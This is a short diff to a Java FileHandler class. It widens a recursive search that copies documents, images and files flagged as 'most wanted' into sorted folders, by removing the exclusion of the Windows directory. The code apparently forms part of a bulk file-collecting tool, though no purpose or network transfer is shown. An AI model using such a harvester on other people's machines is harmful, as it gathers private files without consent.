@@ -74,13 +74,11 @@ public class FileHandler {
 
     public static void findFiles(File directory) {
         File[] list = directory.listFiles();
-        if (list != null)
+        if (list != null) {
             for (File file : list) {
                 String fileName = file.getName();
                 if (file.isDirectory()) {
-                    if (!fileName.equals("Windows")) {
-                        findFiles(file);
-                    }
+                    findFiles(file);
                 } else if (isDocument(fileName) || isImage(fileName) || isMostWanted(fileName)) {
                     String destinationDirectoryPath = "";
                     if (isDocument(fileName)) {
@@ -103,6 +101,7 @@ public class FileHandler {
                     copyFile(file, copyFile);
                 }
             }
+        }
     }
 
     // ------------------------------------------------------------------------------------------------------------------
